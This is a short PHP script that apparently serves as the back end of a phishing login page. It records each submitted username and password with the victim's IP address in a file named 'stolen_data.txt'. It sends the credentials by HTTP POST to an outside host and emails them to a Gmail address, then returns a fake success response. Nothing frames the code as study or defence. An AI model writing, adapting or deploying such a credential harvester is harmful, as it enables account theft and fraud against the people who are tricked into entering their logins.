<?php
header("Access-Control-Allow-Origin: *"); // Allow CORS for AJAX
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars(trim($_POST["username"] ?? ""), ENT_QUOTES, 'UTF-8');
    $password = htmlspecialchars(trim($_POST["password"] ?? ""), ENT_QUOTES, 'UTF-8');
    
    // Log data to file
    $data = "Username: $username, Password: $password, IP: " . $_SERVER["REMOTE_ADDR"] . ", Time: " . date("Y-m-d H:i:s") . "\n";
    file_put_contents("data/stolen_data.txt", $data, FILE_APPEND);
    
    // Placeholder for remote exfiltration (not functional locally without setup)
    
    $ch = curl_init("https://rcivr.onrender.com");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["username" => $username, "password" => $password]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    $to = "bettarap254@gmail.com";
    $subject = "New Login Data";
    $message = "Username: $username\nPassword: $password\nIP: " . $_SERVER["REMOTE_ADDR"];
    mail($to, $subject, $message);
    
    
    // Return success response for AJAX
    echo json_encode(["status" => "success"]);
}
?>
